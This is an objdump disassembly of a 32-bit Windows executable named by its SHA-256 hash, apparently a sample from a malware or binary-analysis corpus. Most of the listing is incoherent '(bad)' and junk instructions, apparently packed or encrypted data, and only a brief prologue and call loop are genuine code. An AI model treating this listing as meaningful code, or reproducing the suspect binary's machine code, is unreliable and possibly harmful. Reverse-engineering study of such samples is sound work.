
659b7c3a678635b80d0ea9f7854af9b56ab8713d9a1c39c0a337f340aff0618c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xe9ca3808,cl
  401025:	fidivr DWORD PTR [esi+0x7e]
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    eax,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    DWORD PTR [ebx+0xf330f00],edx
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0x811b5a5
  4010d8:	pop    eax
  4010d9:	loope  0x401097
  4010db:	shr    DWORD PTR [edx+0x24],1
  4010de:	outs   dx,DWORD PTR ds:[esi]
  4010df:	mul    esp
  4010e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4010e2:	pop    edi
  4010e3:	cli    
  4010e4:	cmp    edx,DWORD PTR [ecx]
  4010e6:	int3   
  4010e7:	cld    
  4010e8:	call   DWORD PTR ds:0x6910517c
  4010ee:	ret    0xbf5f
  4010f1:	sbb    ah,BYTE PTR [ecx+esi*2]
  4010f4:	mov    ah,BYTE PTR [edx+0x5adf545c]
  4010fa:	loope  0x40111f
  4010fc:	mov    ecx,0x1a7bf9ea
  401101:	cmp    al,0xfa
  401103:	sbb    BYTE PTR [eax],ah
  401105:	arpl   WORD PTR [esi+0x265b8027],bp
  40110b:	stos   DWORD PTR es:[edi],eax
  40110c:	ins    BYTE PTR es:[edi],dx
  40110d:	jb     0x4010ff
  40110f:	and    DWORD PTR [esi-0x11ba3722],edi
  401115:	mov    dl,0xe6
  401117:	stos   BYTE PTR es:[edi],al
  401118:	test   BYTE PTR [ebp+0x72ad73f9],0xed
  40111f:	clc    
  401120:	cmp    al,0xbd
  401122:	pop    edi
  401123:	xchg   ebx,eax
  401124:	inc    esi
  401125:	maskmovq mm5,(bad)
  401126:	imul   DWORD PTR [eax+esi*2]
  401129:	test   DWORD PTR [edi],0xa8bb9c9f
  40112f:	push   cs
  401130:	inc    edi
  401131:	ds dec esi
  401133:	or     ah,al
  401135:	es or  esi,esi
  401138:	jecxz  0x401111
  40113a:	push   ebx
  40113b:	xchg   esi,eax
  40113c:	xor    BYTE PTR [eax],bl
  40113e:	test   DWORD PTR [ecx-0x1c],edx
  401141:	push   0x29
  401143:	dec    esi
  401144:	out    dx,al
  401145:	add    DWORD PTR [edi-0x7e2c711],ecx
  40114b:	dec    ebx
  40114c:	fwait
  40114d:	adc    ebp,eax
  40114f:	mov    ds:0x305fec6d,al
  401154:	cdq    
  401155:	aad    0xf2
  401157:	fild   WORD PTR [ebx-0x76]
  40115a:	cmp    bh,bh
  40115c:	push   ds
  40115d:	ja     0x401102
  40115f:	dec    eax
  401160:	mov    bh,BYTE PTR [ebx-0x6b]
  401163:	dec    ebp
  401164:	mov    eax,ds:0x99e11775
  401169:	out    0xce,eax
  40116b:	neg    DWORD PTR [ecx+0x25]
  40116e:	outs   dx,BYTE PTR ds:[esi]
  40116f:	push   esi
  401170:	bound  esi,QWORD PTR [ecx]
  401172:	inc    ebp
  401173:	jg     0x4011b0
  401175:	xor    eax,0xfbe971f9
  40117a:	stos   BYTE PTR es:[edi],al
  40117b:	aad    0x3b
  40117d:	popf   
  40117e:	jns    0x401114
  401180:	mov    bh,0x2f
  401182:	bound  edx,QWORD PTR [edi+0x6f]
  401185:	pop    ds
  401186:	jns    0x401157
  401188:	add    edx,DWORD PTR [esi]
  40118a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40118b:	fsubr  DWORD PTR [ebx-0x8]
  40118e:	fdiv   QWORD PTR [edx-0x1d897215]
  401194:	xor    DWORD PTR [edx-0x45],0x53
  401198:	repnz inc bh
  40119b:	cmp    BYTE PTR [ebp-0x74],0xb9
  40119f:	push   ss
  4011a0:	mov    esp,DWORD PTR [eax]
  4011a2:	test   BYTE PTR [esi],cl
  4011a4:	dec    edi
  4011a5:	add    ah,BYTE PTR [ebx+ebx*4-0x9]
  4011a9:	add    esi,DWORD PTR [ebp+ebx*1+0x5524e9ab]
  4011b0:	in     al,0xbd
  4011b2:	fucomip st,st(1)
  4011b4:	popf   
  4011b5:	or     esp,esi
  4011b7:	fist   WORD PTR [esi-0x61]
  4011ba:	in     eax,dx
  4011bb:	mov    ?,WORD PTR [ebx+0x49]
  4011be:	int    0x2e
  4011c0:	sbb    eax,0x237473d0
  4011c5:	xor    ebp,esi
  4011c7:	pop    esi
  4011c8:	xchg   edx,eax
  4011c9:	mov    edx,0xd39688ee
  4011ce:	jge    0x40118e
  4011d0:	popa   
  4011d1:	fldcw  WORD PTR [esp+edi*8+0x18]
  4011d5:	arpl   WORD PTR [ecx],ax
  4011d7:	inc    ecx
  4011d8:	sub    DWORD PTR [edx+edi*1-0x645edc2b],ebp
  4011df:	in     al,0x1
  4011e1:	in     eax,0xfa
  4011e3:	je     0x4011e9
  4011e5:	(bad)  
  4011e6:	or     eax,0x448ab99d
  4011eb:	pop    ss
  4011ec:	mov    bh,0x6d
  4011ee:	imul   edi,DWORD PTR [eax-0x1315aba1],0xffffffec
  4011f5:	test   BYTE PTR [ecx],al
  4011f7:	jbe    0x401200
  4011f9:	mov    edi,0x8d96cc28
  4011fe:	cmp    ah,cl
  401200:	jae    0x401193
  401202:	in     al,dx
  401203:	mov    esp,0xc6ea5872
  401208:	hlt    
  401209:	add    DWORD PTR [esi-0x5f],0x864a5f16
  401210:	aaa    
  401211:	fisttp DWORD PTR [esp+ebp*2-0x32]
  401215:	out    dx,eax
  401216:	pop    ss
  401217:	adc    BYTE PTR [ebx+0x20],ah
  40121a:	pop    ebx
  40121b:	(bad)  
  40121c:	dec    ebx
  40121d:	fisub  WORD PTR [ecx+edi*1]
  401220:	xchg   ecx,eax
  401221:	sbb    DWORD PTR [ecx],esi
  401223:	sbb    eax,0xecc53221
  401228:	(bad)  
  401229:	adc    ecx,ebx
  40122b:	mov    edx,0x9630ce77
  401230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401231:	lods   eax,DWORD PTR ds:[esi]
  401232:	je     0x40124c
  401234:	stos   BYTE PTR es:[edi],al
  401235:	jle    0x40125f
  401237:	rcl    BYTE PTR [ebx+0xe],cl
  40123a:	xchg   esi,eax
  40123b:	loop   0x40123f
  40123d:	popf   
  40123e:	outs   dx,BYTE PTR ds:[esi]
  40123f:	jne    0x4011f1
  401241:	mov    eax,ds:0xf8e3645a
  401246:	mov    ds:0xdaf91a5e,eax
  40124b:	adc    esi,esp
  40124d:	or     edi,DWORD PTR [edi-0x66dff531]
  401253:	fwait
  401254:	in     eax,dx
  401255:	xchg   BYTE PTR [eax-0x22],al
  401258:	loopne 0x401286
  40125a:	pop    ds
  40125b:	push   es
  40125c:	pushf  
  40125d:	ja     0x40124e
  40125f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  401261:	add    BYTE PTR [ebp-0x28],dl
  401264:	inc    esi
  401265:	add    ebx,DWORD PTR [ebp+0x4a]
  401268:	or     al,0x28
  40126a:	jnp    0x401299
  40126c:	test   DWORD PTR [esi],0xde33fe94
  401272:	jl     0x40123b
  401274:	outs   dx,BYTE PTR ds:[esi]
  401275:	xor    BYTE PTR [esi-0x72],al
  401278:	pop    edi
  401279:	leave  
  40127a:	leave  
  40127b:	lea    esp,ds:0xa496b333
  401281:	xor    bh,ah
  401283:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401284:	cli    
  401285:	mov    ds:0xfecd5b0c,al
  40128a:	jns    0x401225
  40128c:	push   ss
  40128d:	ss daa 
  40128f:	ja     0x40128b
  401291:	sbb    cl,BYTE PTR [esi+0x4d]
  401294:	inc    edx
  401295:	call   0xb5e0:0xa799c24c
  40129c:	ins    DWORD PTR es:[edi],dx
  40129d:	or     al,BYTE PTR [esi-0x64]
  4012a0:	push   es
  4012a1:	sbb    edi,esp
  4012a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012a4:	xor    ebx,DWORD PTR gs:[esi+0x3f]
  4012a8:	sub    al,0xc0
  4012aa:	aam    0xb0
  4012ac:	(bad)  [edi+0x6b7271d9]
  4012b2:	dec    esp
  4012b3:	cmp    cl,BYTE PTR [edi+edi*8+0x51f1a47b]
  4012ba:	loop   0x4012a8
  4012bc:	aam    0xbf
  4012be:	pop    es
  4012bf:	cwde   
  4012c0:	into   
  4012c1:	xchg   ebp,eax
  4012c2:	push   esi
  4012c3:	push   0xffffff99
  4012c5:	rol    DWORD PTR [edi+0x7baa725e],0x6b
  4012cc:	mov    ecx,0xfd5fe422
  4012d1:	mov    WORD PTR [ebp-0x73117af0],gs
  4012d7:	pop    ebx
  4012d8:	out    0x8f,al
  4012da:	loope  0x4012fd
  4012dc:	lea    edx,[ecx]
  4012de:	pop    ecx
  4012df:	push   cs
  4012e0:	outs   dx,BYTE PTR ds:[esi]
  4012e1:	inc    edi
  4012e2:	push   es
  4012e3:	retf   
  4012e4:	int3   
  4012e5:	jl     0x4012c1
  4012e7:	mov    cl,0xb0
  4012e9:	jno    0x40127a
  4012eb:	push   eax
  4012ec:	aas    
  4012ed:	dec    esi
  4012ee:	dec    ebp
  4012ef:	pop    esp
  4012f0:	mov    ah,0x91
  4012f2:	push   esi
  4012f3:	dec    edx
  4012f4:	repnz jecxz 0x401348
  4012f7:	sbb    al,0x45
  4012f9:	mov    esi,0xd879172f
  4012fe:	loope  0x40130b
  401300:	push   ebx
  401301:	retf   0x6c53
  401304:	mov    eax,esi
  401306:	fwait
  401307:	out    dx,eax
  401308:	push   ebx
  401309:	lds    edx,FWORD PTR [edi+0x63]
  40130c:	push   0x5f
  40130e:	test   eax,0x4cb1a680
  401313:	test   DWORD PTR [eax+ebx*8+0x56d77fb1],eax
  40131a:	push   ebx
  40131b:	aaa    
  40131c:	popf   
  40131d:	mov    ds:0x2d90c375,al
  401322:	jl     0x401374
  401324:	jb     0x401395
  401326:	pop    ecx
  401327:	js     0x4012ac
  401329:	adc    dl,ah
  40132b:	jl     0x40136a
  40132d:	gs enter 0x9d1c,0xe7
  401332:	fxam   
  401335:	xor    eax,0x48eacfb3
  40133a:	or     ah,al
  40133c:	mov    ebp,0x32a3d4d0
  401341:	dec    ebp
  401342:	jo     0x4013a6
  401344:	push   ecx
  401345:	inc    edi
  401346:	aad    0x50
  401348:	jp     0x40131a
  40134a:	jno    0x401359
  40134c:	aad    0x2
  40134e:	xor    ebx,DWORD PTR [edx]
  401350:	cmp    eax,0x2e3d3df2
  401355:	aas    
  401356:	xor    cl,BYTE PTR [ecx+eax*8+0x3f51e5bf]
  40135d:	mov    al,ds:0x66b09101
  401362:	push   ebp
  401363:	push   ebx
  401364:	add    ah,BYTE PTR [ebp+0x719db88c]
  40136a:	mov    eax,0x2c87ba9d
  40136f:	imul   eax,ecx,0x11
  401372:	or     BYTE PTR [edi],dl
  401374:	inc    esi
  401375:	outs   dx,DWORD PTR ds:[esi]
  401376:	and    al,0x57
  401378:	dec    DWORD PTR [esi+0x1c]
  40137b:	mov    ebp,DWORD PTR ds:0xc4432354
  401381:	mov    ch,0x96
  401383:	loopne 0x40137b
  401385:	pusha  
  401386:	pop    edi
  401387:	xor    eax,0xc48eb93b
  40138c:	mov    bl,0x3f
  40138e:	mov    bh,dl
  401390:	leave  
  401391:	dec    ebx
  401392:	test   BYTE PTR [edx+0x1d],ch
  401395:	sub    al,0x18
  401397:	in     al,0xf
  401399:	dec    ebx
  40139a:	xchg   esi,eax
  40139b:	push   eax
  40139c:	sti    
  40139d:	lods   eax,DWORD PTR ds:[esi]
  40139e:	leave  
  40139f:	aaa    
  4013a0:	adc    BYTE PTR ds:0x21f7a13,0x74
  4013a7:	stos   DWORD PTR es:[edi],eax
  4013a8:	sub    cl,BYTE PTR [ecx-0x7242e47e]
  4013ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013af:	mov    BYTE PTR [esi+edi*4+0xc475cf1],bl
  4013b6:	icebp  
  4013b7:	in     eax,0xbd
  4013b9:	fstp   QWORD PTR [ebx+ebx*1+0x3f27cfb8]
  4013c0:	shl    BYTE PTR [eax-0x38476471],cl
  4013c6:	jecxz  0x4013e4
  4013c8:	addr16 dec esp
  4013ca:	inc    esi
  4013cb:	hlt    
  4013cc:	push   edi
  4013cd:	test   BYTE PTR [ecx],bh
  4013cf:	push   cs
  4013d0:	rol    BYTE PTR [ecx],1
  4013d2:	and    esi,ebp
  4013d4:	push   esp
  4013d5:	loope  0x401391
  4013d7:	mov    esp,0x36446021
  4013dc:	rcl    DWORD PTR [edi],0xcf
  4013df:	xor    eax,0x16b4abf9
  4013e4:	jle    0x40136f
  4013e6:	cdq    
  4013e7:	jg     0x4013e9
  4013e9:	push   ebx
  4013ea:	mov    dl,0x11
  4013ec:	mov    al,ds:0x561d6a5d
  4013f1:	xor    esp,ecx
  4013f3:	jno    0x4013b6
  4013f5:	adc    ebp,edx
  4013f7:	and    ah,bh
  4013f9:	push   es
  4013fa:	aas    
  4013fb:	sbb    BYTE PTR [edi+edx*1],cl
  4013fe:	and    cl,dh
  401400:	fcmovnbe st,st(1)
  401402:	jne    0x401425
  401404:	xor    bh,BYTE PTR [edi]
  401406:	ss aad 0xec
  401409:	imul   ebp,edi,0x2a
  40140c:	leave  
  40140d:	jl     0x4013b6
  40140f:	mov    al,0xd1
  401411:	jp     0x40145e
  401413:	adc    cl,BYTE PTR fs:[ecx]
  401416:	sub    DWORD PTR [esi+0x31],esi
  401419:	mov    ebx,0x530dffc0
  40141e:	scas   al,BYTE PTR es:[edi]
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    esp,DWORD PTR [eax+0x6f766fb1]
  4014c6:	jge    0x401546
  4014c8:	jle    0x401539
  4014ca:	jge    0x40154a
  4014cc:	jle    0x4014bf
  4014ce:	or     BYTE PTR [edx],cl
  4014d0:	dec    edi
  4014d1:	fild   DWORD PTR [ebx+0x7e720b40]
  4014d7:	adc    DWORD PTR [edi-0x29],esi
  4014da:	outs   dx,BYTE PTR ds:[esi]
  4014db:	mov    ds:0xc05e3c73,eax
  4014e0:	rcl    DWORD PTR [ebx+0x73],1
  4014e3:	and    bl,BYTE PTR [edx]
  4014e5:	jnp    0x401500
  4014e7:	jne    0x4014d0
  4014e9:	mov    WORD PTR [ebx-0x4b],es
  4014ec:	mov    edx,0x9477ef40
  4014f1:	mov    dh,0x85
  4014f3:	inc    edi
  4014f4:	(bad)  
  4014f5:	rep stos BYTE PTR es:[edi],al
  4014f7:	nop
  4014f8:	xchg   edi,eax
  4014f9:	imul   ecx,DWORD PTR [ebp-0x49],0xff6fa04e
  401500:	pusha  
  401501:	add    esi,DWORD PTR [ecx-0x3b427bb5]
  401507:	pusha  
  401508:	cs daa 
  40150a:	cmp    eax,0x4f1d4844
  40150f:	into   
  401510:	mov    bl,0x80
  401512:	xor    eax,0xd4d33424
  401517:	test   DWORD PTR [eax+0x37],edx
  40151a:	stc    
  40151b:	sbb    BYTE PTR [ecx-0x7b0fdfc6],ah
  401521:	in     eax,dx
  401522:	mov    BYTE PTR [ebx],ch
  401524:	adc    DWORD PTR [esi+0x5a],edx
  401527:	fsub   st(6),st
  401529:	loope  0x4015a8
  40152b:	adc    ah,BYTE PTR [ebp-0x38]
  40152e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40152f:	ror    DWORD PTR [ecx-0x65214321],1
  401535:	stos   BYTE PTR es:[edi],al
  401536:	push   ebx
  401537:	fidivr WORD PTR [edi-0x720c1456]
  40153d:	loop   0x4014e8
  40153f:	in     al,0xa4
  401541:	adc    BYTE PTR [eax+ecx*2],ch
  401544:	repz imul eax,DWORD PTR [edi+0x2ea6cc56],0xffffff80
  40154c:	xchg   edx,eax
  40154d:	mov    ebp,0x50413b4b
  401552:	test   BYTE PTR [eax],0x83
  401555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401556:	fdivr  st(0),st
  401558:	out    0x88,al
  40155a:	bound  ebx,QWORD PTR [ebx-0x1cb1ba46]
  401560:	cld    
  401561:	pushf  
  401562:	and    al,0x73
  401564:	sbb    ebx,ebx
  401566:	adc    eax,0x3f4130f4
  40156b:	out    dx,eax
  40156c:	sbb    al,0xc0
  40156e:	dec    ebx
  40156f:	xlat   BYTE PTR ds:[ebx]
  401570:	xchg   BYTE PTR [esi-0x5b],al
  401573:	arpl   WORD PTR [edx-0x9],sp
  401576:	push   edi
  401577:	aas    
  401578:	sbb    BYTE PTR [edx+0xf],bh
  40157b:	sbb    edi,ecx
  40157d:	mov    ss,WORD PTR [esi]
  40157f:	stc    
  401580:	leave  
  401581:	cmp    al,0x4f
  401583:	xchg   esi,eax
  401584:	inc    edx
  401585:	adc    ah,BYTE PTR [edi-0x10ab9df2]
  40158b:	push   edx
  40158c:	fld    QWORD PTR [edi+eax*8-0x15a42321]
  401593:	rcr    BYTE PTR [esi],1
  401595:	sub    eax,0xef38ef80
  40159a:	xchg   ecx,eax
  40159b:	mov    sp,0xd01b
  40159f:	mov    dl,0xe2
  4015a1:	int3   
  4015a2:	enter  0x1371,0xd7
  4015a6:	jl     0x4015a9
  4015a8:	jo     0x401628
  4015aa:	sahf   
  4015ab:	pusha  
  4015ac:	rol    edi,cl
  4015ae:	leave  
  4015af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b0:	mov    WORD PTR [edi],ss
  4015b2:	fst    QWORD PTR [esi-0x1147a9b2]
  4015b8:	sub    eax,DWORD PTR [ecx+0x62]
  4015bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015bc:	repnz out dx,eax
  4015be:	adc    edi,DWORD PTR [eax-0x5c]
  4015c1:	mov    eax,0x358bbb43
  4015c6:	sbb    eax,0xd483a711
  4015cb:	and    eax,0xa6d2aa0e
  4015d0:	(bad)  
  4015d1:	xor    ch,BYTE PTR [ebp+0x2e5c3ce7]
  4015d7:	inc    ecx
  4015d8:	inc    ebp
  4015d9:	call   0x814f:0x8abf018d
  4015e0:	xor    eax,0xb7ba3735
  4015e5:	mov    al,ds:0x8cc53b96
  4015ea:	pop    ecx
  4015eb:	iret   
  4015ec:	xchg   edi,eax
  4015ed:	jno    0x4015ec
  4015ef:	imul   esi,DWORD PTR [edi-0x6b],0xffffff9d
  4015f3:	jo     0x401576
  4015f5:	sbb    eax,0xbfc0cc0
  4015fa:	sbb    DWORD PTR ds:0x5129cd93,0x878026a4
  401604:	dec    edi
  401605:	shl    al,cl
  401607:	and    BYTE PTR [ebx-0x6bce011e],al
  40160d:	mov    ecx,0xa7a44ee3
  401612:	xor    esi,esi
  401614:	mov    ds:0x7a81f4b0,al
  401619:	ret    
  40161a:	add    al,ch
  40161c:	pop    es
  40161d:	bnd jo 0x40161d
  401620:	ja     0x40160d
  401622:	pop    edx
  401623:	push   0x2f
  401625:	mov    bl,0xf9
  401627:	aam    0x1d
  401629:	push   esp
  40162a:	popf   
  40162b:	cli    
  40162c:	mov    ds:0x39a89106,eax
  401631:	aaa    
  401632:	xor    esp,DWORD PTR [edi+eax*1-0x47]
  401636:	jns    0x4016aa
  401638:	(bad)  [ebx]
  40163a:	lock out dx,al
  40163c:	cmp    al,0xba
  40163e:	in     al,dx
  40163f:	cmp    eax,0xf8048333
  401644:	or     eax,0x52d36bbf
  401649:	mov    dl,0xe
  40164b:	in     al,dx
  40164c:	iret   
  40164d:	and    edi,DWORD PTR [ebx+0x529f5c2e]
  401653:	xlat   BYTE PTR ds:[ebx]
  401654:	es cli 
  401656:	mov    cl,0x78
  401658:	cmp    DWORD PTR [ebp+0x4d],ebx
  40165b:	add    ecx,DWORD PTR ds:0xd6c71126
  401661:	aaa    
  401662:	lods   al,BYTE PTR ds:[esi]
  401663:	xor    eax,0x4f2d12d1
  401668:	inc    edi
  401669:	push   ebx
  40166a:	call   0x1b0006f6
  40166f:	sub    BYTE PTR [esp+ebp*1],ch
  401672:	sahf   
  401673:	int    0x6d
  401675:	and    DWORD PTR [eax+0x4b8161f9],esp
  40167b:	div    DWORD PTR ds:0x8dbafcb8
  401681:	inc    esp
  401682:	leave  
  401683:	dec    ebx
  401684:	adc    BYTE PTR [ebx+eiz*2-0x1b],bl
  401688:	push   0xe24a7649
  40168d:	xor    ebp,DWORD PTR [ebx]
  40168f:	js     0x4016f3
  401691:	dec    ebx
  401692:	xor    eax,0x3db588c7
  401697:	inc    ebx
  401698:	inc    edi
  401699:	in     al,dx
  40169a:	jbe    0x40164c
  40169c:	data16 mov bl,0x1f
  40169f:	shl    BYTE PTR [edi],cl
  4016a1:	cmp    eax,0xe378e5b5
  4016a6:	jne    0x40170c
  4016a8:	sbb    dh,BYTE PTR [ebx]
  4016aa:	inc    esi
  4016ab:	inc    edi
  4016ac:	fadd   DWORD PTR [ebx-0x338e7829]
  4016b2:	ins    DWORD PTR es:[edi],dx
  4016b3:	imul   DWORD PTR [ebx-0x6c]
  4016b6:	stos   BYTE PTR es:[edi],al
  4016b7:	ins    BYTE PTR es:[edi],dx
  4016b8:	dec    ecx
  4016b9:	stos   DWORD PTR es:[edi],eax
  4016ba:	ja     0x4016ec
  4016bc:	push   0x93e9be3c
  4016c1:	imul   ebx,DWORD PTR ds:0xf3ffe632,0xe9e7b0f9
  4016cb:	inc    DWORD PTR ds:[esi+0x2fee6d88]
  4016d2:	or     DWORD PTR [edx-0x46],edi
  4016d5:	mov    ecx,0xe40b6b60
  4016da:	xchg   ebx,eax
  4016db:	cmc    
  4016dc:	push   edx
  4016dd:	std    
  4016de:	jbe    0x4016eb
  4016e0:	je     0x4016e6
  4016e2:	bound  eax,QWORD PTR [edx+0x60]
  4016e5:	xchg   edx,eax
  4016e6:	jle    0x401685
  4016e8:	dec    esi
  4016e9:	imul   edx,DWORD PTR [ebx],0x9
  4016ec:	(bad)  
  4016ed:	inc    esp
  4016ee:	inc    esp
  4016ef:	pop    ebp
  4016f0:	test   DWORD PTR es:[ebx-0x35b41844],esi
  4016f7:	mov    cs,WORD PTR [eax]
  4016f9:	add    DWORD PTR [esi],0x23
  4016fc:	fwait
  4016fd:	inc    ebp
  4016fe:	mov    ds:0xaa3cb58a,eax
  401703:	(bad)  
  401704:	icebp  
  401705:	mov    ch,0x9c
  401707:	push   ecx
  401708:	ja     0x401704
  40170a:	ins    BYTE PTR es:[edi],dx
  40170b:	popa   
  40170c:	pop    esp
  40170d:	pop    es
  40170e:	test   eax,0x58ddd28d
  401713:	mov    dh,0xfc
  401715:	fistp  QWORD PTR [edi]
  401717:	pop    esp
  401718:	xor    BYTE PTR [esi+0x36],cl
  40171b:	and    al,0x87
  40171d:	loopne 0x40176c
  40171f:	out    dx,eax
  401720:	sbb    dh,bh
  401722:	jb     0x40176d
  401724:	jl     0x4016b8
  401726:	add    dh,BYTE PTR [eax]
  401728:	fld    DWORD PTR [edi+0x78]
  40172b:	arpl   WORD PTR [ecx+0x21],di
  40172e:	mov    eax,0x704e9403
  401733:	sub    esi,DWORD PTR [eax]
  401735:	aam    0x8e
  401737:	inc    edx
  401738:	ins    DWORD PTR es:[edi],dx
  401739:	and    al,0x21
  40173b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40173c:	inc    edi
  40173d:	mov    ebp,0x7d43c13
  401742:	nop
  401743:	xchg   ecx,eax
  401744:	mov    al,ds:0x793a67c4
  401749:	(bad)  
  40174a:	(bad)  [ebx]
  40174c:	call   0xe0ec:0x90ae65f1
  401753:	jmp    0x2bbe5f6d
  401758:	hlt    
  401759:	ins    BYTE PTR es:[edi],dx
  40175a:	mov    eax,0xfa945f77
  40175f:	push   ebx
  401760:	push   cs
  401761:	mov    dl,0xe8
  401763:	stc    
  401764:	jp     0x401705
  401766:	les    edi,FWORD PTR [ebp+0x563b009d]
  40176c:	gs push edx
  40176e:	adc    eax,0x3a45a065
  401773:	mov    cs,WORD PTR [esi+0x3b]
  401776:	inc    eax
  401777:	ret    0xf573
  40177a:	fisubr DWORD PTR [edi+0x2802b47]
  401780:	cs jge 0x401778
  401783:	fidivr WORD PTR [eax+0x15403584]
  401789:	xchg   ebp,eax
  40178a:	or     dl,BYTE PTR [edx-0x15]
  40178d:	xchg   DWORD PTR [eax],ebx
  40178f:	and    eax,0x3b4659b9
  401794:	cwde   
  401795:	imul   eax,DWORD PTR [edi-0x68],0xffffffe3
  401799:	aad    0x69
  40179b:	or     ecx,ebx
  40179d:	pop    ss
  40179e:	adc    DWORD PTR [eax-0x42],esi
  4017a1:	rcr    DWORD PTR [edi+0x48a798c8],cl
  4017a7:	xchg   ebx,eax
  4017a8:	cmp    DWORD PTR [eax+edi*2+0x32],ebx
  4017ac:	mov    ch,0x80
  4017ae:	jbe    0x40182a
  4017b0:	mov    ah,BYTE PTR [ecx+0x30]
  4017b3:	hlt    
  4017b4:	mov    bh,dl
  4017b6:	sub    esp,edx
  4017b8:	loope  0x4017df
  4017ba:	rcl    DWORD PTR [esi],1
  4017bc:	ret    0x8656
  4017bf:	(bad)  
  4017c0:	cmp    DWORD PTR [ecx-0x3298dc13],eax
  4017c6:	jb     0x4017db
  4017c8:	loopne 0x40175c
  4017ca:	nop
  4017cb:	ss in  eax,dx
  4017cd:	xlat   BYTE PTR ds:[ebx]
  4017ce:	inc    esi
  4017cf:	imul   edx,ecx,0x75
  4017d2:	lods   al,BYTE PTR ds:[esi]
  4017d3:	pushf  
  4017d4:	mov    al,0x9b
  4017d6:	popa   
  4017d7:	(bad)  
  4017d8:	mov    edx,0x6b5934d1
  4017dd:	loopne 0x401834
  4017df:	xchg   edi,eax
  4017e0:	sbb    BYTE PTR [ebp-0x53],cl
  4017e3:	rcl    BYTE PTR [edi+0x52],1
